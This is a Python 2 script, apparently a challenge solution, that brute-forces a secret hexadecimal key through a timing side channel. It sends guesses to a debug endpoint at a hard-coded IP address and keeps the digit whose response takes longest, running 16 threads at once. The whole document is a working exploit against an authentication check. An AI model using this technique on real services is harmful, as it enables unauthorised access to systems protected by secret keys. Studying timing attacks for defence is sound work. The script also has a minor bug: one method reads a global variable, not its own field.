import urllib
from threading import Thread

#A gazzilion seconds
CORRECT_KEY_TIME = 1000000

#fetch the time the debug service needs to process the key
#return CORRECT_KEY_TIME if the key is correct
def get_time(key, input_val):
  data = urllib.urlencode([('key', key), ('input', input_val)])
  f = urllib.urlopen('http://54.83.207.90:4242/?debug=1',data)
  s = "".join(f.read().split("\n"))
  if s.find("Correct key") != -1:
    return CORRECT_KEY_TIME
  i = s.find("Total run: ")
  j = s.find("-->", i)
  return float(s[i + len("Total run: ") : j])

#thread that fetches the time taken by the auth server
#for a pair key, input
class Fetcher(Thread):
  def __init__(self, key, input_val):
    Thread.__init__(self)
    self.key = key
    self.input_val = input_val
  def run(self):
    self.output = (get_time(self.key, input_val), self.key)

#Start with an empty key and attempt all possible keys built
#with the key + 1 hexadecimal digit.
#Assume the correct prefix takes longer to be processed than 
#all the others of the same length.
#Could make it faster in single-threaded by choosing the first 
#digit that makes the time "significantly larger" than the previous ones,
#but this would require more data (than a single input), to determine
#what is "significantly larger" with a good level of confidence for the 
#auth system being used, so I'm just using 16 threads to try all the
#possible digits at once.
def solve(input_val):
  candidates = "0123456789abcdef" 
  key = ""

  while 1:
    threads = [Fetcher(key+c, input_val) for c in candidates]
    for thread in threads:
      thread.start()
    for thread in threads:
      thread.join()
    time, key = max([thread.output for thread in threads])
    if time == CORRECT_KEY_TIME:
      return key
    
input_val=raw_input()
print solve(input_val)
